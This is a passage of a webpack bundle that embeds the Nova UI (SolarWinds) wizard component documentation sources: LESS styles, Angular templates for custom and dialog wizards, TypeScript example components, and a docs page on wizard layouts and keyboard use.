 padding: 0 8px;\n    }\n\n    .nui-wizard-step-header--selected {\n        .setCssVariable(background-color, nui-color-active);\n\n        color: @nui-color-text-light;\n        border-color: transparent;\n\n        .nui-wizard-step-label {\n            .setCssVariable(color, nui-color-text-inverse);\n        }\n    }\n\n    .custom-header {\n        .nui-wizard-horizontal-header-container {\n            border-top: none;\n\n            .nui-wizard-horizontal-line {\n                margin: 0;\n            }\n        }\n\n        //.nui-wizard-horizontal-content-container {\n        //    padding: 0;\n        //}\n\n        .custom-summary {\n            border-left: @nui-line-default @nui-color-line-default solid;\n        }\n    }\n\n    .nui-wizard-footer {\n        border: none;\n        justify-content: space-between;\n\n        button {\n            min-width: 0;\n            margin: 0;\n        }\n    }\n}\n'},21786:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="form">\n    <nui-wizard-custom #wizard>\n        \x3c!-- Overview content--\x3e\n        <ng-container summary>\n            <h2>Overview</h2>\n            <nui-progress\n                [show]="true"\n                [stacked]="true"\n                [percent]="progress | number : \'1.0-0\'"\n                [showNumber]="true"\n            >\n            </nui-progress>\n            <p>Step {{ selectedIndex + 1 }} out of {{ steps }} steps</p>\n            <p>\n                Name:\n                {{\n                    form.get(["personDetails", "name"])?.value || "Not provided"\n                }}\n            </p>\n            <p>\n                Symptoms:\n                <ng-container\n                    [ngSwitch]="form.get([\'personDetails\', \'symptoms\'])?.value"\n                >\n                    <ng-container *ngSwitchCase="true">\n                        {{\n                            form.get(["diseaseDetails", "date"]).valid\n                                ? "Since " +\n                                  form\n                                      .get(["diseaseDetails", "date"])\n                                      ?.value.format("D MMM YYYY")\n                                : "Yes"\n                        }}\n                    </ng-container>\n                    <ng-container *ngSwitchCase="false" i18n>No</ng-container>\n                    <ng-container *ngSwitchDefault i18n>Unknown</ng-container>\n                </ng-container>\n            </p>\n            <p>\n                Email:\n                {{\n                    form.get(["contactDetails", "email"])?.value ||\n                        "Not provided"\n                }}\n            </p>\n        </ng-container>\n\n        \x3c!--  content of the 1st step --\x3e\n        <nui-wizard-step-v2\n            i18n-label\n            label="Person Details"\n            formName="personDetails"\n            [stepControl]="form.get([\'personDetails\'])"\n        >\n            \x3c!-- content of the current step --\x3e\n            <nui-form-field\n                [control]="form.get([\'personDetails\', \'name\'])"\n                i18n-caption\n                caption="Name"\n            >\n                <nui-textbox formControlName="name"></nui-textbox>\n                <nui-validation-message\n                    for="required"\n                    *ngIf="\n                        form.get([\'personDetails\', \'name\'])?.errors?.required\n                    "\n                    i18n\n                >\n                    This is required\n                </nui-validation-message>\n                <nui-validation-message\n                    for="minlength"\n                    *ngIf="\n                        form.get([\'personDetails\', \'name\'])?.errors\n                            ?.[\'minlength\']\n                    "\n                    i18n\n                >\n                    Minimum length is 3\n                </nui-validation-message>\n            </nui-form-field>\n\n            <nui-form-field\n                [control]="form.get([\'personDetails\', \'symptoms\'])"\n                i18n-caption\n                caption="Do you have Covid ?"\n            >\n                <nui-checkbox\n                    formControlName="symptoms"\n                    [indeterminate]="\n                        form.get([\'personDetails\', \'symptoms\'])?.pristine\n                    "\n                    i18n\n                >\n                    Diseases symptoms\n                </nui-checkbox>\n                <nui-validation-message\n                    for="required"\n                    *ngIf="\n                        form.get([\'personDetails\', \'symptoms\'])?.errors\n                            ?.required\n                    "\n                    i18n\n                >\n                    This is required\n                </nui-validation-message>\n            </nui-form-field>\n\n            \x3c!-- content of the footer --\x3e\n            <ng-template nuiWizardStepFooter>\n                <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n            </ng-template>\n        </nui-wizard-step-v2>\n\n        \x3c!--  content of the optional step --\x3e\n        <nui-wizard-step-v2\n            *ngIf="form.get([\'personDetails\', \'symptoms\'])?.value"\n            i18n-label\n            label="Disease Details"\n            formName="diseaseDetails"\n            [stepControl]="form.get([\'diseaseDetails\'])"\n        >\n            <ng-template nuiWizardStepLabel i18n\n                >Disease Details for your Symptoms</ng-template\n            >\n            <nui-form-field\n                [control]="form.get([\'diseaseDetails\', \'date\'])"\n                i18n-caption\n                caption="When did you noticed your first symptoms ?"\n            >\n                <nui-date-picker formControlName="date" i18n></nui-date-picker>\n                <nui-validation-message\n                    for="required"\n                    *ngIf="\n                        form.get([\'diseaseDetails\', \'date\'])?.errors?.required\n                    "\n                    i18n\n                >\n                    Date when disease manifested is required\n                </nui-validation-message>\n            </nui-form-field>\n            <ng-template nuiWizardStepFooter>\n                <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n                <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n            </ng-template>\n        </nui-wizard-step-v2>\n\n        \x3c!--  content of the 2nd step --\x3e\n        <nui-wizard-step-v2\n            i18n-label\n            label="Contact Details"\n            formName="contactDetails"\n            [stepControl]="form.get([\'contactDetails\'])"\n        >\n            \x3c!-- content of the current step --\x3e\n            <nui-form-field\n                [control]="form.get([\'contactDetails\', \'email\'])"\n                i18n-caption\n                caption="Email"\n            >\n                <nui-textbox type="email" formControlName="email"></nui-textbox>\n                <nui-validation-message\n                    for="required"\n                    *ngIf="\n                        form.get([\'contactDetails\', \'email\'])?.errors?.required\n                    "\n                    i18n\n                >\n                    This is required\n                </nui-validation-message>\n\n                <nui-validation-message\n                    for="email"\n                    *ngIf="\n                        form.get([\'contactDetails\', \'email\'])?.errors\n                            ?.[\'email\']\n                    "\n                    i18n\n                >\n                    Invalid email\n                </nui-validation-message>\n            </nui-form-field>\n            <nui-form-field\n                [control]="form.get([\'contactDetails\', \'phone\'])"\n                i18n-caption\n                caption="Phone"\n            >\n                <nui-textbox type="email" formControlName="phone"></nui-textbox>\n            </nui-form-field>\n\n            \x3c!-- content of the footer --\x3e\n            <ng-template nuiWizardStepFooter>\n                <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n                <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n            </ng-template>\n        </nui-wizard-step-v2>\n\n        \x3c!--  content of the final step --\x3e\n        <nui-wizard-step-v2 i18n-label label="Final step">\n            <span i18n>Thanks for your feedback and take care!</span>\n            <ng-template nuiWizardStepFooter>\n                <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n                <button type="button" nui-button (click)="wizard.reset()">\n                    Reset\n                </button>\n            </ng-template>\n        </nui-wizard-step-v2>\n\n        <ng-template #wizardPrevious>\n            <button\n                type="button"\n                nuiWizardPrevious\n                nui-button\n                icon="caret-left"\n            >\n                Back\n            </button>\n        </ng-template>\n\n        <ng-template #wizardNext>\n            <button\n                nuiWizardNext\n                type="button"\n                nui-button\n                displayStyle="primary"\n                icon="caret-right"\n                iconRight="true"\n                (click)="validate(wizard.selected)"\n            >\n                Next\n            </button>\n        </ng-template>\n    </nui-wizard-custom>\n</form>\n'},99110:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkStepper, STEPPER_GLOBAL_OPTIONS } from "@angular/cdk/stepper";\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    Component,\n    ViewChild,\n    ViewEncapsulation,\n} from "@angular/core";\nimport { FormBuilder, FormGroup, Validators } from "@angular/forms";\n// eslint-disable-next-line import/no-deprecated\nimport { tap } from "rxjs/operators";\n\nimport { WizardDirective, WizardStepV2Component } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-custom",\n    templateUrl: "wizard-custom.component.html",\n    styleUrls: ["wizard-custom.component.less"],\n    host: {\n        class: "nui-wizard-custom-layout",\n        "aria-orientation": "horizontal",\n    },\n    providers: [\n        { provide: WizardDirective, useExisting: WizardCustomComponent },\n        { provide: CdkStepper, useExisting: WizardCustomComponent },\n    ],\n    encapsulation: ViewEncapsulation.None,\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class WizardCustomComponent extends WizardDirective {}\n\n@Component({\n    selector: "nui-wizard-custom-example",\n    templateUrl: "./wizard-custom.example.component.html",\n    styleUrls: ["wizard-custom.component.less"],\n    providers: [\n        {\n            provide: STEPPER_GLOBAL_OPTIONS,\n            useValue: { displayDefaultIndicatorType: false },\n        },\n    ],\n})\nexport class WizardCustomExampleComponent implements AfterViewInit {\n    public form;\n\n    public steps: number = 1;\n    public selectedIndex: number = 0;\n    public progress: number;\n\n    @ViewChild("wizard") wizard: WizardCustomComponent;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.form = this.formBuilder.group({\n            personDetails: this.formBuilder.group({\n                name: ["", [Validators.required, Validators.minLength(3)]],\n                symptoms: [undefined, Validators.required],\n            }),\n            diseaseDetails: this.formBuilder.group({\n                date: ["", Validators.required],\n            }),\n            contactDetails: this.formBuilder.group({\n                email: ["", [Validators.required, Validators.email]],\n                phone: [""],\n            }),\n        });\n    }\n\n    public ngAfterViewInit(): void {\n        const update = (selectedIndex?: number, steps?: number) => {\n            setTimeout(() => {\n                if (steps) {\n                    this.steps = steps;\n                }\n                if (selectedIndex !== undefined && selectedIndex >= 0) {\n                    this.selectedIndex = selectedIndex;\n                }\n                this.progress = (100 * (1 + this.selectedIndex)) / this.steps;\n            });\n        };\n\n        this.wizard.selectionChange\n            .pipe(\n                tap((i) => {\n                    update(i.selectedIndex);\n                })\n            )\n            .subscribe();\n\n        this.wizard.steps.changes\n            .pipe(\n                tap((c) => {\n                    update(undefined, c.length);\n                })\n            )\n            .subscribe();\n    }\n\n    validate(step: WizardStepV2Component): void {\n        // mark all fields from current step as touched\n        // in order to display the validation messages\n        Object.keys((step.stepControl as FormGroup)?.controls || {}).forEach(\n            (key) => {\n                const field = this.wizard.selected.stepControl.get(key);\n                field?.markAsTouched();\n            }\n        );\n    }\n}\n'},37321:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #dialogWizard>\n    <div nuiResizeObserver #dialog>\n        <div nui-busy [busy]="busy">\n            <div class="busy-content">\n                <nui-dialog-header\n                    i18n-title\n                    title="Wizard dialog"\n                    (closed)="closeDialog()"\n                ></nui-dialog-header>\n                <div class="dialog-body compact-mode">\n                    <nui-wizard-horizontal #wizard>\n                        \x3c!--  This defines the first step of the wizard --\x3e\n                        <nui-wizard-step-v2>\n                            \x3c!-- This defines the header label of this wizard step  --\x3e\n                            <ng-template nuiWizardStepLabel\n                                >Completed</ng-template\n                            >\n\n                            \x3c!-- the current step content --\x3e\n                            <div class="step-content-wrapper">\n                                <span i18n\n                                    >This is the first step of our horizontal\n                                    wizard.</span\n                                >\n                            </div>\n                            \x3c!-- content of the footer --\x3e\n                            <ng-template nuiWizardStepFooter>\n                                <button\n                                    class="btn-busy"\n                                    type="button"\n                                    nui-button\n                                    icon="reload"\n                                    (click)="toggleBusy()"\n                                >\n                                    Toggle busy\n                                </button>\n                                <ng-container\n                                    *ngTemplateOutlet="wizardCancel"\n                                ></ng-container>\n                                <ng-container\n                                    *ngTemplateOutlet="wizardNext"\n                                ></ng-container>\n                            </ng-template>\n                        </nui-wizard-step-v2>\n\n                        <nui-wizard-step-v2>\n                            <ng-template nuiWizardStepLabel>Active</ng-template>\n\n                            <div class="step-content-wrapper">\n                                <span i18n\n                                    >This is the second step of our horizontal\n                                    wizard.</span\n                                >\n                            </div>\n                            <ng-template nuiWizardStepFooter>\n                                <ng-container\n                                    *ngTemplateOutlet="wizardCancel"\n                                ></ng-container>\n                                <ng-container\n                                    *ngTemplateOutlet="wizardPrevious"\n                                ></ng-container>\n                                <ng-container\n                                    *ngTemplateOutlet="wizardNext"\n                                ></ng-container>\n                            </ng-template>\n                        </nui-wizard-step-v2>\n\n                        <nui-wizard-step-v2>\n                            <ng-template nuiWizardStepLabel\n                                >Not visited</ng-template\n                            >\n\n                            <div class="step-content-wrapper">\n                                <span i18n\n                                    >This is the third step of our horizontal\n                                    wizard</span\n                                >\n                            </div>\n\n                            <ng-template nuiWizardStepFooter>\n                                <ng-container\n                                    *ngTemplateOutlet="wizardCancel"\n                                ></ng-container>\n                                <ng-container\n                                    *ngTemplateOutlet="wizardPrevious"\n                                ></ng-container>\n                                <ng-container\n                                    *ngTemplateOutlet="wizardNext"\n                                ></ng-container>\n                            </ng-template>\n                        </nui-wizard-step-v2>\n\n                        <nui-wizard-step-v2>\n                            <ng-template nuiWizardStepLabel\n                                >Summary</ng-template\n                            >\n                            <div class="step-content-wrapper">\n                                <span i18n\n                                    >We finally reached our last step</span\n                                >\n                            </div>\n                            <ng-template nuiWizardStepFooter>\n                                <ng-container\n                                    *ngTemplateOutlet="wizardCancel"\n                                ></ng-container>\n                                <ng-container\n                                    *ngTemplateOutlet="wizardPrevious"\n                                ></ng-container>\n                                <button\n                                    type="button"\n                                    displayStyle="primary"\n                                    nui-button\n                                    (click)="\n                                        finishWizard();\n                                        overlay.hide();\n                                        closeDialog()\n                                    "\n                                    i18n\n                                >\n                                    Finish\n                                </button>\n                            </ng-template>\n                        </nui-wizard-step-v2>\n\n                        <ng-template #wizardCancel>\n                            <button\n                                type="button"\n                                displayStyle="action"\n                                nui-button\n                                (click)="\n                                    openConfirmationOverlay(overlay, wizard)\n                                "\n                            >\n                                Cancel\n                            </button>\n                        </ng-template>\n\n                        <ng-template #wizardPrevious>\n                            <button\n                                type="button"\n                                nuiWizardPrevious\n                                nui-button\n                                icon="caret-left"\n                            >\n                                Back\n                            </button>\n                        </ng-template>\n\n                        <ng-template #wizardNext>\n                            <button\n                                nuiWizardNext\n                                type="button"\n                                nui-button\n                                displayStyle="primary"\n                                icon="caret-right"\n                                iconRight="true"\n                            >\n                                Next\n                            </button>\n                        </ng-template>\n                    </nui-wizard-horizontal>\n                </div>\n            </div>\n            <nui-spinner\n                size="large"\n                i18n-message\n                message="Data is loading from remote server..."\n            ></nui-spinner>\n        </div>\n    </div>\n    <nui-overlay #overlay [toggleReference]="dialog">\n        <div class="overlay-class">\n            <div class="overlay-content">\n                <div class="header">Really want to leave?</div>\n                <div class="body">\n                    <p i18n>\n                        There is at least one accomplished step within this\n                        wizard. Are you sure you want to leave?\n                    </p>\n                </div>\n                <div class="footer">\n                    <button\n                        nui-button\n                        displayStyle="action"\n                        type="button"\n                        (click)="overlay.hide()"\n                    >\n                        Cancel\n                    </button>\n                    <button\n                        nui-button\n                        type="button"\n                        (click)="overlay.hide(); closeDialog()"\n                    >\n                        Leave\n                    </button>\n                </div>\n            </div>\n        </div>\n    </nui-overlay>\n</ng-template>\n\n<button nui-button type="button" (click)="openDialog(dialogWizard)" i18n>\n    Open dialog wizard\n</button>\n'},78677:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-colors";\n@import (reference) "nui-framework-spaces";\n@import (reference) "nui-framework-typography";\n\n.step-content-wrapper {\n    padding: @nui-space-md;\n}\n\n.btn-busy {\n    margin-right: auto;\n}\n\n.overlay {\n    &-class {\n        display: flex;\n        height: 100%;\n        .setCssVariable(background-color, nui-color-overlay-busy);\n    }\n\n    &-content {\n        display: flex;\n        flex-direction: column;\n        justify-content: center;\n        max-width: 460px;\n        margin: auto;\n        padding: (@nui-space-md * 2);\n        .setCssVariable(background-color, nui-color-bg-content);\n\n        .header {\n            display: flex;\n            justify-content: center;\n            margin-bottom: @nui-space-md;\n            .nui-text-widget();\n        }\n\n        .body {\n            display: flex;\n            text-align: center;\n            .nui-text-size(default);\n        }\n\n        .footer {\n            display: flex;\n            flex-direction: row;\n            justify-content: center;\n\n            button[displayStyle="action"] {\n                margin-right: @nui-space-md;\n            }\n        }\n    }\n}\n'},52101:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    FlexibleConnectedPositionStrategy,\n    OverlayRef,\n} from "@angular/cdk/overlay";\nimport { Component, Inject, OnDestroy, TemplateRef } from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    DialogService,\n    NuiDialogRef,\n    OverlayComponent,\n    ToastService,\n    WizardHorizontalComponent,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-v2-dialog-example",\n    templateUrl: "./wizard-dialog.example.component.html",\n    styleUrls: ["./wizard-dialog.example.component.less"],\n})\nexport class WizardDialogExampleComponent implements OnDestroy {\n    public onDestroy$ = new Subject<void>();\n    public overlayTriggered$ = new Subject<void>();\n\n    private overlayRef: OverlayRef;\n    public busy: boolean = false;\n    public activeDialog: NuiDialogRef;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        private toastService: ToastService\n    ) {}\n\n    public vegetables = [\n        $localize`Cabbage`,\n        $localize`Potato`,\n        $localize`Tomato`,\n        $localize`Carrot`,\n    ];\n    public selectedVegetables = [$localize`Potato`, $localize`Tomato`];\n\n    public isChecked(vegetable: string): boolean {\n        return this.selectedVegetables.indexOf(vegetable) > -1;\n    }\n\n    public valuesChanged(values: any[]): void {\n        this.selectedVegetables = [...values];\n    }\n\n    public openDialog(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, {\n            size: "lg",\n            windowClass: "active-dialog",\n        });\n    }\n\n    public closeDialog(): void {\n        this.activeDialog.close();\n    }\n\n    public toggleBusy(): void {\n        this.busy = !this.busy;\n        setTimeout(() => {\n            this.busy = false;\n        }, 3000);\n    }\n\n    // Open confirmation overlay\n    public openConfirmationOverlay(\n        overlay: OverlayComponent,\n        wizard: WizardHorizontalComponent\n    ): void {\n        if (wizard.selectedIndex === 0) {\n            this.closeDialog();\n            return;\n        }\n\n        this.overlayTriggered$.next();\n\n        // Toggling the overlay to get an access to the \'overlayRef\'\n        overlay.toggle();\n\n        this.overlayRef = overlay.getOverlayRef();\n        // Here we update the positions for the overlay. By default, the overlay service connects the overlay to the bottom-left\n        // corner of the toggle reference element. We change this behavior here by setting new positions, since we want overlay to\n        // stick to the upper-top corner of the parent container\n        (\n            this.overlayRef.getConfig()\n                .positionStrategy as FlexibleConnectedPositionStrategy\n        ).withPositions([\n            {\n                originX: "start",\n                originY: "top",\n                overlayX: "start",\n                overlayY: "top",\n            },\n        ]);\n        // We update the size of the overlay container to follow the dimensions of the new \'toggle reference\' container we set in the very first step\n        this.updateOverlayDimensions(overlay);\n\n        // Handling ESC events inside overlay\n        this.activeDialog?.closed$\n            .pipe(takeUntil(this.overlayTriggered$), takeUntil(this.onDestroy$))\n            .subscribe(() => overlay.hide());\n    }\n\n    public open(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, {\n            size: "lg",\n            backdrop: "static",\n            useOverlay: true,\n        });\n    }\n\n    public actionDone(): void {\n        this.activeDialog.close();\n    }\n\n    public onContainerResize(overlay: OverlayComponent): void {\n        this.updateOverlayDimensions(overlay);\n    }\n\n    public finishWizard(): void {\n        this.toastService.success({\n            title: $localize`Success`,\n            message: $localize`Wizard was completed successfully`,\n            options: {\n                timeOut: 2000,\n            },\n        });\n    }\n\n    public ngOnDestroy(): void {\n        this.onDestroy$.next();\n        this.onDestroy$.complete();\n        this.overlayTriggered$.complete();\n    }\n\n    private updateOverlayDimensions(overlay: OverlayComponent): void {\n        this.overlayRef?.updateSize({\n            width: overlay.toggleReference.getBoundingClientRect().width,\n            height: overlay.toggleReference.getBoundingClientRect().height,\n        });\n    }\n}\n'},3897:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Layout</h2>\n<h3>Horizontal Layout Wizard</h3>\n<p>\n    To use the horizontal wizard component, place a\n    <code>nui-wizard-horizontal</code> element in your template and include one\n    or more\n    <code\n        ><a href="../components/WizardStepComponent.html" target="_blank"\n            >nui-wizard-step-v2</a\n        ></code\n    >\n    elements as children of the <code>nui-wizard-horizontal</code> element.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-horizontal"\n    exampleTitle="Horizontal Layout Wizard"\n>\n    <nui-wizard-horizontal-example></nui-wizard-horizontal-example>\n</nui-example-wrapper>\n\n<h3>Wizard with confirmation dialog</h3>\n<p>\n    It may be a good idea to ask a user whether they really want to quit a\n    wizard, e.g.if they decide to hit `Cancel` while some of the wizard step\n    fields are already filled in. This example reflects this use case and shows\n    how one can add a confirmation dialog to make a user decide whether they\n    really want to quit or stay where they are and continue.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-with-confirmation-dialog-on-cancel"\n    exampleTitle="Wizard with confirmation dialog on cancel"\n>\n    <nui-wizard-with-confirmation-dialog-on-cancel-example></nui-wizard-with-confirmation-dialog-on-cancel-example>\n</nui-example-wrapper>\n\n\x3c!--Will be updated in scope of the NUI-6099--\x3e\n\n\x3c!--<h3>Vertical Layout Wizard</h3>--\x3e\n\x3c!--<nui-example-wrapper filenamePrefix="wizard-vertical-layout" exampleTitle="Vertical Layout Wizard">--\x3e\n\x3c!--    <nui-wizard-vertical-example></nui-wizard-vertical-example>--\x3e\n\x3c!--</nui-example-wrapper>--\x3e\n\n<h3>Usage with a dialog</h3>\n<p>\n    You can pass an existing wizard component as content of the dialog window.\n    You should insert wizard component in dialog body.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-dialog"\n    exampleTitle="wizard in dialog"\n>\n    <nui-wizard-v2-dialog-example></nui-wizard-v2-dialog-example>\n</nui-example-wrapper>\n\n<h3>Busy step</h3>\n<p>You can make your step busy to forbid actions.</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-busy"\n    exampleTitle="wizard step busy"\n>\n    <nui-wizard-v2-busy-example></nui-wizard-v2-busy-example>\n</nui-example-wrapper>\n\n<h3>Adding step dynamically</h3>\n<p>\n    You are able to add wizard steps dynamically. The dynamic step can be\n    enabled/disabled programmatically by clicking the "Enable/Disable step\n    w/button" under the wizard.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-dynamic"\n    exampleTitle="wizard add dynamic step"\n>\n    <nui-wizard-dynamic-example></nui-wizard-dynamic-example>\n</nui-example-wrapper>\n\n<h3>Removing step</h3>\n<p>You are able to remove steps by index.</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-remove-step"\n    exampleTitle="wizard remove step"\n>\n    <nui-wizard-remove-step-example></nui-wizard-remove-step-example>\n</nui-example-wrapper>\n\n\x3c!--TODO Fix Custom Layout Wizard in scope NUI-6112 --\x3e\n\x3c!--<h3>Custom Layout Wizard</h3>--\x3e\n\x3c!--<nui-example-wrapper filenamePrefix="wizard-custom-layout" exampleTitle="Custom Layout Wizard">--\x3e\n\x3c!--    <nui-wizard-custom-example></nui-wizard-custom-example>--\x3e\n\x3c!--</nui-example-wrapper>--\x3e\n\n<h3>Async Form Validation</h3>\n<p>\n    To handle async validation check \'PENDING\' status of WizardV2Step\n    stepControl\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-async-form-validation"\n    exampleTitle="Async Form Validation"\n>\n    <nui-wizard-async-form-validation-example></nui-wizard-async-form-validation-example>\n</nui-example-wrapper>\n\n<h3>Wizard with custom step state icons</h3>\n<p>\n    The wizard step can be in four different states: <code>initial</code>,\n    <code>selected</code>, <code>completed</code>, and <code>error</code>. For\n    each of these steps there is a corresponding icon in the header for a\n    certain step, which dynamically changes along with the step state change. It\n    is possible to override the default set of step state icons and their\n    colors, and there are two ways of doing that.\n</p>\n<ol>\n    <li>Global</li>\n    <li>Step Specific</li>\n</ol>\n<p><u>Global</u></p>\n<p>\n    Nova provides you with the <code>WIZARD_CONFIG</code> injection token, which\n    allows you to override the default wizard settings in a global context. For\n    instance, set the necessary icons settings with this token on a module level\n    to allow all wizards within a module to receive the same icon configuration.\n</p>\n<p><u>Step Specific</u></p>\n<p>\n    Use the <code>stepIconsConfig</code> input of the\n    <code>nui-wizard-step-v2</code> component to pass the step icons config\n    specifically to this step. It will override the global settings for this\n    particular step.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-with-custom-icons"\n    exampleTitle="Wizard with custom icons"\n>\n    <nui-wizard-with-custom-icons-example></nui-wizard-with-custom-icons-example>\n</nui-example-wrapper>\n\n<h3>Custom footer</h3>\n<p>\n    Customizing the footer layout content and style for each step is quite easy,\n    as you can see in the example below:\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-custom-footer"\n    exampleTitle="Wizard with Custom Footer"\n>\n    <nui-wizard-custom-footer-example></nui-wizard-custom-footer-example>\n</nui-example-wrapper>\n\n<h3>Restore Wizard State</h3>\n<p>\n    To restore the wizard state you need to pass previous wizard steps as input.\n    See the example below. You can press the "Reset step" button on the last\n    step in the wizard. After that close the dialog and open the wizard again.\n    You will see that all steps except the last are restored.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-restore-state"\n    exampleTitle="Restore Wizard State"\n>\n    <nui-wizard-restore-state-example></nui-wizard-restore-state-example>\n</nui-example-wrapper>\n\n<h3>Wizard Step Change Event Example</h3>\n<p>You are able to subscribe when the selected step has changed.</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-step-change"\n    exampleTitle="Wizard Step Change"\n>\n    <nui-wizard-step-change-example></nui-wizard-step-change-example>\n</nui-example-wrapper>\n\n<h3>Responsive Header</h3>\n<p>\n    This example shows how Wizard V2 handles the multiple steps. When there are\n    a lot of steps in the wizard the step header can overflow the headers\n    container. If this happens, Wizard V2 switches to the responsive mode and\n    put the overflown items into overflow components, which indicate how many\n    items are there hidden. You can try navigating through the items and\n    resizing the browser window to see how this responsive behavior works.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-responsive-header"\n    exampleTitle="Wizard Header Responsiveness"\n>\n    <nui-wizard-responsive-header-example></nui-wizard-responsive-header-example>\n</nui-example-wrapper>\n\n<h3>Wizard Tooltip</h3>\n<p>\n    We always show tooltip for string label. If you use custom template for\n    label or don\'t want to see tooltip you could define it inside content\n    projection.\n</p>\n<nui-example-wrapper\n    filenamePrefix="wizard-tooltip"\n    exampleTitle="Wizard Tooltip"\n>\n    <nui-wizard-tooltip-example></nui-wizard-tooltip-example>\n</nui-example-wrapper>\n\n<h2>Keyboard interaction</h2>\n<ul>\n    <li>\n        <code>TAB/SHIFT+TAB</code> for focusing on the next/previous tabbable\n        element\n    </li>\n    <li>\n        <code>LEFT_ARROW/RIGHT_ARROW</code> for navigation on the previous/next\n        step header\n    </li>\n    <li><code>HOME/END</code> for focusing on the first/last step header</li>\n    <li><code>ENTER, SPACE</code> to select the step</li>\n</ul>\n'},31253:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-wizard-v2-example",\n    templateUrl: "./wizard-docs.component.html",\n})\nexport class 